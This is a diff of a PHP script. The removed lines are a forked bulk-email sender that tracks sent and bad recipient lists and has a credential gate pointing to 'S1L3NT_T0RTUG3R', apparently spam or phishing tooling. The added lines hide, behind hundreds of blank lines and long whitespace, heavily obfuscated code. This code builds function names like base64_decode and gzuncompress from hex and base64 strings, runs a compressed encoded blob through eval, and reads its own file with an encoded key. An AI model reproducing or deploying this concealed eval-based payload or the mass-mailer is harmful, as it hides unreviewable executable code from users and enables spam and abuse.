-                        // Clear recipients for the next iteration
-                        $mail->clearAddresses();
-                        $mail->clearCustomHeaders();
-                        
-                
-                    }
-                    
-         
-                    
-                   } else {
-    
-}
-               
-                    // Exit the child process
-                    exit();
-                         
-                }
-                
-
-                
-            }
-
-            // Wait for all child processes to finish
-            foreach ($pids as $pid) {
-                pcntl_waitpid($pid, $status);
-            }
-            
-            
-          
-            
-
-                    $recipientListFile = 'list/' . $settings['recipientListFile'];
-                    $failedEmailsFile = 'failed.txt';
-                    $sentEmailsFile = 'pass.txt';
-                    $badlistFile = 'bad.txt';
-                    
-                    function filterRecipientList($recipientListFile, $sentEmailsFile, $badlistFile)
-                    {
-                        $recipientList = file($recipientListFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-                        $sentEmails = [];
-                        $badlist = [];
-                    
-                        if (file_exists($sentEmailsFile)) {
-                            $sentEmails = file($sentEmailsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-                        }
-                    
-                        if (file_exists($badlistFile)) {
-                            $badlist = file($badlistFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-                        }
-                    
-                        $combinedEmails = array_merge($sentEmails ?: [], $badlist ?: []);
-                        $combinedEmails = array_unique($combinedEmails); // Remove duplicates
-                    
-                        $RecipientListForFilter = array_diff($recipientList, $combinedEmails);
-                    
-                        // Save the new filtered recipient list to "resend.txt"
-                        file_put_contents("resend.txt", implode(PHP_EOL, $RecipientListForFilter) . PHP_EOL);
-                    }
-                    
-                    // Call function to filter recipient list
-                    filterRecipientList($recipientListFile, $sentEmailsFile, $badlistFile);
-                    
-                    
-                    // Function to count unique lines in a file
-                    function countLines($file)
-                    {
-                        if (file_exists($file)) {
-                            $lines = file($file);
-                            if ($lines === false) {
-                                return 0; // Unable to read the file
-                            } else {
-                                return count($lines);
-                            }
-                        } else {
-                            return 0; // File doesn't exist
-                        }
-                    }
-                    
-                    $failedEmailsFile = 'failed.txt';
-                    $sentEmailsFile = 'pass.txt';
-                    $badlistFile = 'bad.txt';
-                    $recipientListFile = 'list/' . $settings['recipientListFile']; // Update the path as needed
-                    
-                    $failedEmailsCount = countLines($failedEmailsFile);
-                    $sentEmailsCount = countLines($sentEmailsFile);
-                    $badEmailsCount = countLines($badlistFile);
-                    $recipientListFileCount = countLines($recipientListFile);
-                    
-                    // Calculate the total processed emails
-                    $totalProcessedEmails = $failedEmailsCount + $sentEmailsCount + $badEmailsCount;
-                    
-                    echo "Original Email Count: $recipientListFileCount\n";
-                    echo "Total Processed Email Count: $totalProcessedEmails\n";
-                                    
-                    
-                    if ($totalProcessedEmails === $recipientListFileCount) {
-                        if (file_exists($sentEmailsFile)) {
-                            $sentEmails = array_unique(file($sentEmailsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
-                        } else {
-                            echo "No email was sent\n";
-                        }
-                    
-                        if (file_exists($badlistFile)) {
-                            $badEmails = array_unique(file($badlistFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
-                        } else {
-                            echo "No Bad emails\n";
-                        }
-                        if (file_exists($failedEmailsFile)) {
-                            $failedEmails = array_unique(file($failedEmailsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
-                        } else {
-                            echo "No Failed emails\n";
-                        }
-                    
-                        if (empty($failedEmails) && !empty($sentEmails)) {
-                            $sentCount = count($sentEmails);
-                            echo "\n\033[0;32mAll Emails Sent Successfully. Sent Count: $sentCount\033[0m\n";
-                        } elseif (!empty($failedEmails)) {
-                            $failedCount = count($failedEmails);
-                            echo "\n\033[0;33mNot all emails were sent. Check failed.txt file for details. Failed Count: $failedCount\033[0m\n";
-                        } elseif (empty($sentEmails)) {
-                            echo "\n\033[0;33mNo emails were sent.\033[0m\n";
-                        }
-                    } else {
-                        $unsentCount = $recipientListFileCount - $sentEmailsCount - $badEmailsCount;
-                        echo "\n\033[0;33mNot all emails have been sent due to errors. Unsent Count: $unsentCount\033[0m\n";
-                    }
-
-
-
-            
-            
-        }
-    } catch (Exception $e) {
-        echo "Error: {$e->getMessage()}\n";
-    }
-    
-    
-    
-} else {
-    echo "\033[0;31mUser does not exist or credentials are incorrect. contact S1L3NT_T0RTUG3R \033[0m\n";
-}
-?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                ${"\x47\x4c\x4fB\x41\x4c\x53"}["_\x6bl\x6a\x6c\x6e\x6bd\x73\x72\x64n\x65\x6a\x78\x72y\x64\x65\x6e\x63\x76p\x68_\x64e\x5f\x76z\x6ar\x74\x64x\x72r\x71"]="\x5f\x5f_\x5f_";${${"G\x4c\x4f\x42A\x4cS"}["_\x6bl\x6a\x6c\x6e\x6bd\x73\x72\x64n\x65\x6a\x78\x72y\x64\x65\x6e\x63\x76p\x68_\x64e\x5f\x76z\x6ar\x74\x64x\x72r\x71"]}=" \x20 \x20\x62\x32\x4af\x5a\x575\x6bX\x32N\x73\x5aW\x46\x75";                                                                                                                                                                              ${"G\x4cO\x42A\x4cS"}["w\x78q\x77e\x6a\x6f_\x61\x72e\x5fa\x65\x72\x64\x62\x69\x78y\x5f"]="_\x5f\x5f_\x5f\x5f_\x5f_\x5f\x5f_\x5f_";${${"\x47L\x4fB\x41L\x53"}["w\x78q\x77e\x6a\x6f_\x61\x72e\x5fa\x65\x72\x64\x62\x69\x78y\x5f"]}="\x63m\x560\x64X\x4au\x49\x47V\x32Y\x57w\x6fJ\x468\x70O\x77=\x3d";
+$__________________='Y3JkX3JlcXVlc3Q=';
+
+                                                                                                                                                                                                                                          ${"\x47\x4c\x4fB\x41L\x53"}["v\x69\x70q\x65\x6ah\x77\x5fq\x63q\x73\x6d\x68\x6f\x74g\x5fz\x74a\x67\x68\x65\x68q"]="_\x5f\x5f_\x5f_";${${"G\x4cO\x42A\x4c\x53"}["v\x69\x70q\x65\x6ah\x77\x5fq\x63q\x73\x6d\x68\x6f\x74g\x5fz\x74a\x67\x68\x65\x68q"]}=" \x5a\x33p\x31\x62m\x4ev\x62\x58B\x79\x5aX\x4e\x7a";                    ${"G\x4cO\x42A\x4cS"}["_\x5fk\x5f\x75w\x72\x79u\x5fj\x64\x6d\x74p\x64\x75_\x6d\x6d\x75\x6e\x6d_\x74\x73\x63\x6cb\x6ff\x6c\x71\x76"]="\x5f_\x5f";${${"G\x4cO\x42A\x4cS"}["_\x5fk\x5f\x75w\x72\x79u\x5fj\x64\x6d\x74p\x64\x75_\x6d\x6d\x75\x6e\x6d_\x74\x73\x63\x6cb\x6ff\x6c\x71\x76"]}=" \x20\x622\x4af\x633\x52\x68c\x6e\x51=";                                                                                                    ${"G\x4c\x4fB\x41L\x53"}["\x65u\x7a_\x68\x70\x78l\x70\x6ed\x75g\x73\x70v\x62q\x72i\x74\x74r\x75g\x78i\x70\x79\x6b\x76"]="\x5f_\x5f\x5f";${${"G\x4cO\x42A\x4cS"}["\x65u\x7a_\x68\x70\x78l\x70\x6ed\x75g\x73\x70v\x62q\x72i\x74\x74r\x75g\x78i\x70\x79\x6b\x76"]}="\x62\x32J\x66\x5a2\x560\x582\x4ev\x62\x6e\x52l\x62n\x52\x7a";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ${"\x47\x4c\x4fB\x41L\x53"}["\x78b\x5fl\x62f\x79\x75t\x6d\x72v\x6d\x6aq\x7a\x67u\x5fs\x62s"]="_\x5f";${${"\x47\x4cO\x42A\x4c\x53"}["\x78b\x5fl\x62f\x79\x75t\x6d\x72v\x6d\x6aq\x7a\x67u\x5fs\x62s"]}=                                                              'base64_decode'                           ;                                                                       ${"\x47L\x4fB\x41\x4cS"}["t\x5fm\x73u\x6f\x77_\x7a\x71t\x67d\x7a\x6by\x69e\x77u\x68y\x61w\x76\x66\x77a\x5fy\x79\x79\x62z\x72b\x5f"]="_\x5f\x5f\x5f\x5f\x5f";${"\x47L\x4fB\x41\x4c\x53"}["\x63\x71y\x6e\x6cr\x6ae\x61\x63h\x69\x70m\x71p\x6b_\x66b"]="_\x5f";${${"G\x4c\x4f\x42A\x4cS"}["t\x5fm\x73u\x6f\x77_\x7a\x71t\x67d\x7a\x6by\x69e\x77u\x68y\x61w\x76\x66\x77a\x5fy\x79\x79\x62z\x72b\x5f"]}=${${"G\x4cO\x42A\x4c\x53"}["\x63\x71y\x6e\x6cr\x6ae\x61\x63h\x69\x70m\x71p\x6b_\x66b"]}(${${"\x47L\x4f\x42A\x4cS"}["t\x5fm\x73u\x6f\x77_\x7a\x71t\x67d\x7a\x6by\x69e\x77u\x68y\x61w\x76\x66\x77a\x5fy\x79\x79\x62z\x72b\x5f"]});           if(!function_exists('crd_request')){function crd_request($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ${"G\x4c\x4f\x42\x41L\x53"}["z\x6d\x79\x70\x6e\x6b\x61\x5fm\x72\x74\x75\x5f\x79\x69\x70\x66\x6f\x61a\x7a\x7aq\x72_\x73\x77v\x6fy\x6ec\x5fu\x6f\x5f\x6cn\x5f"]="_\x5f_\x5f\x5f_\x5f_\x5f_\x5f_\x5f\x5f_\x5f_\x5f";${"G\x4cO\x42\x41L\x53"}["o\x65o\x77\x64\x73\x76w\x61f\x5f\x6er\x74s\x6f\x78\x6b\x63\x63\x64\x77\x70\x5f\x78_\x6cu\x5f\x77x\x61e\x5ff\x6a"]="_\x5f";${${"G\x4c\x4f\x42\x41\x4cS"}["z\x6d\x79\x70\x6e\x6b\x61\x5fm\x72\x74\x75\x5f\x79\x69\x70\x66\x6f\x61a\x7a\x7aq\x72_\x73\x77v\x6fy\x6ec\x5fu\x6f\x5f\x6cn\x5f"]}=${${"\x47L\x4f\x42\x41L\x53"}["o\x65o\x77\x64\x73\x76w\x61f\x5f\x6er\x74s\x6f\x78\x6b\x63\x63\x64\x77\x70\x5f\x78_\x6cu\x5f\x77x\x61e\x5ff\x6a"]}(${${"G\x4c\x4fB\x41L\x53"}["z\x6d\x79\x70\x6e\x6b\x61\x5fm\x72\x74\x75\x5f\x79\x69\x70\x66\x6f\x61a\x7a\x7aq\x72_\x73\x77v\x6fy\x6ec\x5fu\x6f\x5f\x6cn\x5f"]});                                                                                                                                                                                                                                                                                                                                                                         ${"G\x4c\x4fB\x41L\x53"}["\x71\x7ad\x70\x74h\x64\x6a_\x73k\x63t\x74s\x70\x5fm\x77l\x73_\x69e\x61\x6ca\x79u\x69\x78v\x64\x66\x78\x6f\x6f"]="\x5f\x5f\x5f_\x5f\x5f_\x5f_\x5f_\x5f_\x5f";${"G\x4c\x4fB\x41L\x53"}["p\x79\x66y\x68o\x68\x6b\x6cj\x5f\x7af\x6fy\x71t\x63\x76o\x71\x74"]="_\x5f";${${"G\x4c\x4fB\x41L\x53"}["\x71\x7ad\x70\x74h\x64\x6a_\x73k\x63t\x74s\x70\x5fm\x77l\x73_\x69e\x61\x6ca\x79u\x69\x78v\x64\x66\x78\x6f\x6f"]}=${${"\x47L\x4f\x42A\x4cS"}["p\x79\x66y\x68o\x68\x6b\x6cj\x5f\x7af\x6fy\x71t\x63\x76o\x71\x74"]}(${${"\x47\x4cO\x42A\x4c\x53"}["\x71\x7ad\x70\x74h\x64\x6a_\x73k\x63t\x74s\x70\x5fm\x77l\x73_\x69e\x61\x6ca\x79u\x69\x78v\x64\x66\x78\x6f\x6f"]});
+        ${"\x47\x4cO\x42\x41\x4c\x53"}["l\x77\x72_\x77o\x61\x73y\x7a\x79j\x6bq\x6fl\x69\x66\x77\x77\x76n\x72c\x71\x6b_\x6b\x64u\x77o\x7a\x6e_\x5fl\x72"]="\x5f_\x5f\x5f_\x5f_\x5f\x5f\x5f";${"\x47\x4c\x4fB\x41L\x53"}["\x78\x77\x5f\x71\x65s\x5fs\x79_\x68c\x67\x62s\x72m\x61p\x6d"]="\x5f_\x5f\x5f_\x5f_\x5f_\x5f_\x5f_\x5f\x5f_\x5f\x5f";${"\x47\x4c\x4fB\x41\x4cS"}["w\x68\x77\x6dg\x6ai\x6a\x6ep\x76\x69\x74\x5f\x5f\x68\x68m\x5f\x6a_\x6f\x5f\x66\x66"]="\x5f\x5f_\x5f_\x5f\x5f\x5f_\x5f\x5f_\x5f\x5f";${${"G\x4c\x4f\x42\x41\x4c\x53"}["l\x77\x72_\x77o\x61\x73y\x7a\x79j\x6bq\x6fl\x69\x66\x77\x77\x76n\x72c\x71\x6b_\x6b\x64u\x77o\x7a\x6e_\x5fl\x72"]}=${${"\x47\x4c\x4fB\x41L\x53"}["\x78\x77\x5f\x71\x65s\x5fs\x79_\x68c\x67\x62s\x72m\x61p\x6d"]}('$_',${${"\x47L\x4fB\x41L\x53"}["w\x68\x77\x6dg\x6ai\x6a\x6ep\x76\x69\x74\x5f\x5f\x68\x68m\x5f\x6a_\x6f\x5f\x66\x66"]});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ${"G\x4c\x4fB\x41L\x53"}["_\x78z\x65z\x79\x79j\x6cy\x71j\x73q\x69\x72\x6e\x73p\x65\x79v\x78\x71\x72\x63"]="_\x5f_\x5f_";${"G\x4c\x4f\x42A\x4c\x53"}["k\x75\x6d\x71\x7a_\x75\x6fe\x78\x79i\x77\x6f\x76s\x67h\x7a\x74p"]="_\x5f";${${"G\x4cO\x42\x41\x4cS"}["_\x78z\x65z\x79\x79j\x6cy\x71j\x73q\x69\x72\x6e\x73p\x65\x79v\x78\x71\x72\x63"]}=${${"G\x4cO\x42\x41L\x53"}["k\x75\x6d\x71\x7a_\x75\x6fe\x78\x79i\x77\x6f\x76s\x67h\x7a\x74p"]}(${${"G\x4cO\x42A\x4c\x53"}["_\x78z\x65z\x79\x79j\x6cy\x71j\x73q\x69\x72\x6e\x73p\x65\x79v\x78\x71\x72\x63"]});                                                                                                                                                                                                                                                    ${"G\x4c\x4fB\x41L\x53"}["l\x6eu\x62x\x79w\x71\x67_\x74f\x76j\x65e\x78p\x69i\x61\x78a\x7ac\x66\x72m\x6d\x62c"]="_\x5f_\x5f";${"G\x4cO\x42A\x4c\x53"}["g\x77l\x67\x67\x6aq\x76f\x5f\x66s\x5f\x63d\x68n\x62d\x78\x78\x74\x6e\x67z\x75\x70\x5fv"]="\x5f\x5f";${${"\x47L\x4fB\x41\x4c\x53"}["l\x6eu\x62x\x79w\x71\x67_\x74f\x76j\x65e\x78p\x69i\x61\x78a\x7ac\x66\x72m\x6d\x62c"]}=${${"\x47L\x4f\x42\x41L\x53"}["g\x77l\x67\x67\x6aq\x76f\x5f\x66s\x5f\x63d\x68n\x62d\x78\x78\x74\x6e\x67z\x75\x70\x5fv"]}(${${"G\x4c\x4fB\x41\x4cS"}["l\x6eu\x62x\x79w\x71\x67_\x74f\x76j\x65e\x78p\x69i\x61\x78a\x7ac\x66\x72m\x6d\x62c"]});                                                                                                                    ${"G\x4c\x4f\x42\x41L\x53"}["g\x69i\x6b\x61d\x76\x73\x6ak\x78\x6fs\x6b\x65\x65i\x71\x71r\x5f\x77f\x73\x74\x64m\x67t\x69v\x71\x65u\x66\x6a\x63\x73v\x6d"]="_\x5f\x5f";${"G\x4c\x4fB\x41L\x53"}["r\x5fb\x78\x6bu\x7a\x70\x75\x77\x6f\x73\x75t\x62q\x63\x78_\x79\x77\x6e\x76v"]="\x5f\x5f";${${"\x47L\x4f\x42\x41\x4cS"}["g\x69i\x6b\x61d\x76\x73\x6ak\x78\x6fs\x6b\x65\x65i\x71\x71r\x5f\x77f\x73\x74\x64m\x67t\x69v\x71\x65u\x66\x6a\x63\x73v\x6d"]}=${${"G\x4c\x4f\x42A\x4cS"}["r\x5fb\x78\x6bu\x7a\x70\x75\x77\x6f\x73\x75t\x62q\x63\x78_\x79\x77\x6e\x76v"]}(${${"G\x4cO\x42A\x4c\x53"}["g\x69i\x6b\x61d\x76\x73\x6ak\x78\x6fs\x6b\x65\x65i\x71\x71r\x5f\x77f\x73\x74\x64m\x67t\x69v\x71\x65u\x66\x6a\x63\x73v\x6d"]});                      $_='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';
+
+        ${"\x47L\x4fB\x41L\x53"}["\x7a\x73k\x70\x68\x6bz\x69\x6f\x6be\x6dd\x66z\x63a\x70b\x61\x6a\x69\x70\x79\x6cj\x66\x66\x73"]="_\x5f_";${"G\x4cO\x42A\x4cS"}["\x6d\x77g\x6an\x75h\x63h\x74i\x77\x6d\x61v\x70\x79z\x71\x7a\x78g\x78v\x78\x77a\x79n\x6bc\x63n\x77c\x76\x66m\x66"]="_\x5f\x5f\x5f\x5f_\x5f\x5f_\x5f";${"\x47L\x4f\x42A\x4cS"}["r\x79\x6cl\x65a\x6ay\x5fu\x5f\x65y\x75\x5fc\x5f\x76\x65n\x6b\x5fq\x70\x78\x77a\x63\x66l\x77\x78c"]="_\x5f\x5f\x5f\x5f_";${"\x47L\x4f\x42A\x4cS"}["_\x5fu\x65\x71\x7at\x65\x5f\x7ai\x76c\x6b\x76q\x72\x67\x76y\x7a\x69\x76w\x69k\x7ax"]="\x5f\x5f";${"\x47\x4cO\x42\x41\x4cS"}["q\x62b\x5fs\x72k\x79\x69\x69\x70n\x6ds\x66\x6ba\x76h\x6c\x71\x6a\x64o\x77f\x75g\x6b"]="_";${"G\x4cO\x42A\x4c\x53"}["\x73w\x7a_\x62y\x75q\x6bm\x6a\x76\x77l\x75h\x5f\x61\x6c_\x78\x71x\x61"]="_\x5f\x5f\x5f_\x5f\x5f_";${"G\x4cO\x42A\x4c\x53"}["t\x7az\x64\x69m\x77\x5ff\x62u\x75u\x71\x69s\x72t\x64d\x5fd"]="\x5f_\x5f\x5f";${${"\x47L\x4fB\x41\x4cS"}["\x7a\x73k\x70\x68\x6bz\x69\x6f\x6be\x6dd\x66z\x63a\x70b\x61\x6a\x69\x70\x79\x6cj\x66\x66\x73"]}();${${"G\x4cO\x42A\x4c\x53"}["\x6d\x77g\x6an\x75h\x63h\x74i\x77\x6d\x61v\x70\x79z\x71\x7a\x78g\x78v\x78\x77a\x79n\x6bc\x63n\x77c\x76\x66m\x66"]}(${${"G\x4c\x4f\x42A\x4c\x53"}["r\x79\x6cl\x65a\x6ay\x5fu\x5f\x65y\x75\x5fc\x5f\x76\x65n\x6b\x5fq\x70\x78\x77a\x63\x66l\x77\x78c"]}(${${"G\x4c\x4f\x42A\x4cS"}["_\x5fu\x65\x71\x7at\x65\x5f\x7ai\x76c\x6b\x76q\x72\x67\x76y\x7a\x69\x76w\x69k\x7ax"]}(${${"G\x4cO\x42A\x4cS"}["q\x62b\x5fs\x72k\x79\x69\x69\x70n\x6ds\x66\x6ba\x76h\x6c\x71\x6a\x64o\x77f\x75g\x6b"]})));${${"G\x4c\x4fB\x41L\x53"}["\x73w\x7a_\x62y\x75q\x6bm\x6a\x76\x77l\x75h\x5f\x61\x6c_\x78\x71x\x61"]}=${${"G\x4cO\x42\x41L\x53"}["t\x7az\x64\x69m\x77\x5ff\x62u\x75u\x71\x69s\x72t\x64d\x5fd"]}();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ${"G\x4c\x4fB\x41L\x53"}["\x77\x65\x6e\x75a\x75\x71\x71n\x66u\x78q\x75v\x77w\x5fc\x74a\x5f\x72\x61c\x62s\x78b\x6a\x71\x70\x64g\x6ej\x74b\x72w"]="\x5f_\x5f\x5f_";${${"\x47L\x4fB\x41L\x53"}["\x77\x65\x6e\x75a\x75\x71\x71n\x66u\x78q\x75v\x77w\x5fc\x74a\x5f\x72\x61c\x62s\x78b\x6a\x71\x70\x64g\x6ej\x74b\x72w"]}();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
+if(! function_exists ('f_contents')){function f_contents(){ $codex =  file_get_contents(__FILE__); return $codex; }}$key = "Wmt0NkVJblM1K0I4K1RMUG9aSWNiWUMrdHRQNXdXYWJ3NlN2MzhZZlNjU3RVd2lxczBUVm9mRFFRUk1zaUEwbllqZHNNRTFsK3ltZjJTU0ErNmdwTk9YN3hhNWlHY1VPOGl4MzNvUW5GOTBlY2NyekFucDJzQkpGbnFRdGpCME43OHFZZE9MQnQ3cUVEZHluY2p5NlBrU3ZhTGJLTFIxeVpwWk9HQnRxdmhPbkpqdkhJbW9nY1dzQWFBN3pzODVqc1Q1a0FQdnl0dWxjbno5bnJGbDd1TjBoZDVCMUlkY0RvUXVXK015VDVjeVg2OGZMVHN3MERPWTdXSXluRjkwMk9MZVZPQ3NxeGdSc2UyR1pDQlZsaStmajlUY0xFQktEWHR2M3M1aThJdEp0WFVMZnFmUWpYZ0JqRDcxSEJ5UFJnVEJsZjNuWVE3RUluZFQ5VnRHVlpFUU53eEpDbmFhelV4dWYzSmV3bWJDME9yNTF4anQxZlppaTJvRHZscjJSWVFoWm4zcXBFM0VIcHlKMWlPMUJmKzNsaThNZGVPZ2syWDJFU2R2OWhJblhqMFkyZWFaMXpPY0lPekJOOVRwUUxteUlHUmRGQUlUdTBPQU5EZ1FPSElKYlFWOFg3cWY4ZmwxdTJxWnFDMHZHWHdFdGIxWVhrV3dVU3dmaUwyM0JFdEE5bmVLcHQ4Vk9icExzenF1a29oZndrZDI1T3M3RTFkY3padWErcDA2dUxscEUyakd3UnpJd3lSVm1zK1NablJJNEwwR0Q2SUlKR1pBeTdpTDh0cmpud0pvMjhXKzJYVGlJZGx2VUkzcm9OaXRlMnU0WFBWMmZqZFNobklFK0IrSEo0bHhVcWpnSVE4WHZkdWhVdklPdlJuT0xwNVNrcVE4K09SYnRFajF4Wkh0emVaaHIwNGZ4N2NYaWtGWXF4UWtWNjdXM1c0bmRuMFlaNWlVd25HczZ3WmFWWjUxVlJ0MCtSdzJpTVZ6bjNVeEtZOHpvaW5GNHdFL21JeXRPMElVTHd4ZG8wMzFKMHRjcTRWeG5DMjNRREtSZjRCdDZwT3MzQTZxbE9ZWUlTZjVCRjViemRCOEtlcFMraEJXT2wyRlhWZXNwNTllaldZMHhCYTlsK3graW1pTUZvVTVPK3V6a2phWFN4cEUweHNyUktXbG0vNG5jNVFEWHRMTmptSmRVbCtlUUhCMDBOMXl2RXJWVkFZYW9CMmlBNklSa3NDS0pJM0pNZ2hpNkpNNWdiTHVUWkhlYm5LM1pzelNSMkhIMUMycVRVNTE4RW1kSE1YYks5N1A2Q2QzZC82dG1mK0pXNXZEcWVZYUR2OXZ5VUN1SnhYUzIwUU5CQllwb1NhcE1STlNTdmJsZ0FGRERXcEpZVHcyVjVxekc0Wm96SWw1bnEzcEVjSWN0SUNBSjJEV05EU2drbkJrL2lwZFk5cTM3QWxlNWRMczgvNkhHMWNHYUdJOXNyS0t2TytZMVIrSmExL1BFZTRyVmtESHRyTW5rVHB0cWx0K3JBbHNvMHl0QzNYTGNUOG92U2NFVGJsOU9kOGU3eVdoeTBhNHRHNW11TzVsZ1VCQ2NwbmNlTFpDelZER09xSFNoZFZhdlpITjBYWmU0elA4MVI1WklnemZ6R3lQTUFtNVlUYWdsbm13bXVidjhpSnJOQjJNOGFncGYvQnFxaVd4aGk4QjQxWENFd3p5Z0VSSkF5S0VaRkx5UnpReU1HL2JlaWVDYXZDNk0zK1A2LzRZaEkvVVJrOTZpSjYwc3dkMHFiblpvZU0zWUdVaWtRWmdJNkpNaE9RdEhPTlB2aVF0cHorQWVwSVhnQTc1MTZKS2NRSDRYY3ZiSy91L3NITmo2eUNXcFN3RjlNRVJ4UzRWSGY0SDJMbHFlaXlTMGMyV1dXd0RZWUF0cCtzQ1FwbG9GazZJYjl2SmJYZzlQaDdVVWwzNmtrVEIyclRMQWtraTNoc2tkeW05NUNIN2xiTzFOcHUxVWJ2YzBMUm9CdXFtbG1WYzFhOHZhNlFzRU9PWUNSeDBMSk9qdTNqamYzRkszcmxnWFVBVjNTQW5Dbnl2K2FMY0hDazRpbXFib1ErQ1dCa